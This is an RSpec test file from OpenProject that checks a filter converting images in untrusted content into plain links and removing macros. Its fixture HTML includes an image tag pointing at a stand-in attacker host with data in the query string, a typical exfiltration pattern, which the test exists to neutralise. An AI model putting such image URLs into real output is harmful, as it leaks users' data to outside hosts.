# frozen_string_literal: true

#-- copyright
# OpenProject is an open source project management software.
# Copyright (C) the OpenProject GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License version 3.
#
# OpenProject is a fork of ChiliProject, which is a fork of Redmine. The copyright follows:
# Copyright (C) 2006-2013 Jean-Philippe Lang
# Copyright (C) 2010-2013 the ChiliProject Team
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.
#
# See COPYRIGHT and LICENSE files for more details.
#++

require "spec_helper"

RSpec.describe OpenProject::TextFormatting::Filters::UntrustedSourceFilter do
  let(:html) do
    '<p>Text <img src="https://attacker.example/?d=secret" alt="Logo"> <img src="/attachments/1"> <img alt="Inline"></p>' \
      '<macro class="macro-placeholder"></macro>'
  end

  subject(:result) { described_class.new(html, context).call.to_html }

  context "for an untrusted source" do
    let(:context) { { untrusted_source: true } }

    it "turns images into links so that nothing is fetched" do
      expect(result).not_to include("<img")
      expect(result).to include('<a href="https://attacker.example/?d=secret" rel="noopener noreferrer nofollow">Image: Logo</a>',
                                '<a href="/attachments/1" rel="noopener noreferrer nofollow">Image: /attachments/1</a>')
    end

    it "names an image without a source" do
      expect(result).to include("Image: Inline")
      expect(result).not_to include('href=""')
    end

    it "removes macros" do
      expect(result).not_to include("<macro")
    end
  end

  context "for a trusted source" do
    let(:context) { {} }

    it "keeps images and macros" do
      expect(result).to include("<img", "<macro")
    end
  end

  describe "in the formatting pipeline" do
    subject(:formatted) do
      OpenProject::TextFormatting::Renderer.format_text(text, untrusted_source: true, disable_macro_expansion: true)
    end

    let(:text) { "# Heading\n\n![x](https://attacker.example/a.png)\n\n<macro class=\"toc\"></macro>" }

    it "renders neither images nor macros" do
      expect(formatted).not_to include("<img", "<macro", "op-uc-toc")
      expect(formatted).to include("Image: x")
    end
  end
end
